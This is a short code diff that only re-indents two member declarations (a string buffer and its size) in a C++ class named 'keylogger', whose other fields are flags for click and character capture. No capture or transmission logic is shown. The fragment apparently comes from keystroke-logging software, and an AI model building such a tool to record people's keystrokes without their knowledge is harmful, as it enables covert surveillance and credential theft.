@@ -6,8 +6,8 @@ using namespace std;
 class keylogger
 {
     public :
-  		string* a_buffer;
-  		size_t a_buffer_size;
+      string* a_buffer;
+      size_t a_buffer_size;
       bool a_no_click;
       bool a_alphabet_only;
       bool a_store_character;
